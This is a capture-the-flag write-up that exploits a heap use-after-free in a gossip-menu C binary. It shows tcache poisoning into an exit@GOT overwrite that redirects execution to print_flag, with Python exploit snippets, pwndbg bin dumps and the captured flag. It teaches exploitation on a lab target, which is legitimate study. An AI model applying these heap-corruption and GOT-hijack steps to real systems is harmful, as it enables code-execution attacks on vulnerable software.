# spill the t

We start with a quick check on the mitigations present in the binary:

```bash
checksec file vuln
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    Stripped:   No
```

* `No PIE` means that addresses that lie in the elf sections of the program (eg `print_flag` in `.text`) reside at fixed addresses, so we can use them without requiring a PIE-base leak.
* `No RELRO` means that we can overwrite GOT entries to redirect execution.

The binary is dynamically linked against glibc **2.31**. This has the following implications:
1. glibc 2.30 introduced a per-bin **tcache count check**. During allocation, glibc only services a tcache bin if `tcache->counts[idx] > 0`, meaning that the corresponding count must be consistent for allocations to work.
2. glibc 2.31 predates **safe-linking** (introduced in glibc 2.32), meaning freelist pointers remain unencrypted and can be forged directly without an information leak.


## Reverse Engineering 

Running `vuln` prints the following menu:
```bash
Options:
  1: Exit
  2: Hear tea
  3: Spill tea
  4: Update tea
  5: Remove tea
```

The user can:
* `exit_tea()` — Exits the program
* `hear_tea()` — Displays active gossip entries
* `spill_tea()` — Allocates a structure and stores gossip text
* `update_tea()` — Modifies existing gossip content
* `remove_tea()` — Removes a gossip entry

### The win function

There's a `print_flag` function which serves as a simple target where we want to redirect execution.

```c

void print_flag() {
    FILE *flag = fopen("flag.txt", "r");
    char buf[64];
    while (fgets(buf, sizeof(buf), flag)) {
        printf("%s", buf);
    }
    fclose(flag);
}

```


### The vulnerability

The core issue is that the `active` flag is never actually checked, and freed pointers are never cleared from the global linked list `spilled_tea`. While `spill_tea()` and `remove_tea()` do set/clear `active` correctly, nothing in the program actually gates behaviour on it: `remove_tea()` frees a node regardless of its active state, and `update_tea()` writes to a node's buffer regardless of whether it's still active (i.e. not yet freed).

```c
void update_tea() {
    if (spilled_tea == NULL) {
        puts("No tea to update :(");
        return;
    }

    printf("Oh wait rly what changed?\nTea index: ");
    unsigned int idx;
    int success = scanf("%u", &idx);
    getchar();
    if (success == 0) {
        puts("Please enter an unsigned integer.");
        return;
    }

    tea_t* tea = spilled_tea;
    for (; idx > 0; idx--) {
        if (tea->next == NULL) {
            puts("Invalid index.");
            return;
        }
        tea = tea->next;
    }

    puts("Ok spill the new tea plz:");
    fgets(tea->tea, 48, stdin);
    tea->tea[strcspn(tea->tea, "\n")] = '\0';
    //for (int i = strcspn(tea->tea, "\n"); i < 48; i++) {
    //    tea->tea[i] = '\0';
    //}
    puts("dude that is wild");
}

void remove_tea() {
    if (spilled_tea == NULL) {
        puts("No tea to remove :(");
        return;
    }

    printf("ight which one was cap?\nTea index: ");
    unsigned int idx;
    int success = scanf("%u", &idx);
    getchar();
    if (success == 0) {
        puts("Please enter an unsigned integer.");
        return;
    }

    tea_t* tea = spilled_tea;
    for (; idx > 0; idx--) {
        if (tea->next == NULL) {
            puts("Invalid index.");
            return;
        }
        tea = tea->next;
    }

    // Apparently I need to do this in C. Should have just used java ts pmo so much rn i fr cannot be bothered testing
    tea->active = 0;
    free(tea->tea);
    free(tea);

    puts("yeah that was lowkey untrue");
}
```


This has two important implications:
1. A Use-After-Free (UAF) is possible 
2. A Double-Free is possible

## Exploitation 

The double-free path works too, but the UAF is more straightforward (requires `fastbin dup`), so that's the route taken here.

The plan is to use the UAF for tcache poisoning, giving us an arbitrary write-what-where primitive. Since the binary has no RELRO, we can use that write to overwrite a GOT entry and hijack control flow.

First, fill the tcache by allocating two chunks and freeing both. This is an importantly sets the tcache count to $2$ which will be satisfy the count check later. 
```python
    # in idx 0, 1
    cmd_spill(io)
    cmd_spill(io)
    
    # now in tcache
    cmd_remove(io, 1)
    cmd_remove(io, 0)
```

Now we use the UAF to poison the tcache. Because the chunk is considered `free`, writing to it lets us overwrite the `fd` pointer of the chunk in the tcache bin:

```python
    cmd_update(io, 0, p64(EXIT_GOT))
```


Here's the bin state before and after, via gdb pwndbg:
```bash
# Before
$ bins
0x40 [  2]: 0x39e922c0 —▸ 0x39e92320 ◂— 0
# After
$ bins
0x40 [  2]: 0x39e922c0 —▸ 0x403988 (exit@got[plt]) —▸ 0x4010e6 (exit@plt+6) ◂— ...
```

With the tcache corrupted, two allocations are enough to walk the poisoned pointer back to us and overwrite the GOT entry:
```python
    cmd_spill(io)
    cmd_spill(io, p64(PRINT_FLAG)) #poisoned in idx 1
```

Finally, calling `exit_tea()` triggers the now-hijacked `exit@plt` GOT entry, jumping into `print_flag()`:

```python
    cmd_exit(io)
```

The full exploit is in [solve.py](./solve.py). Running it prints our flag:
```bash
./solve.py REMOTE
disorientation{Ch3ck_l1nKtr3e_1n_bi0}
```
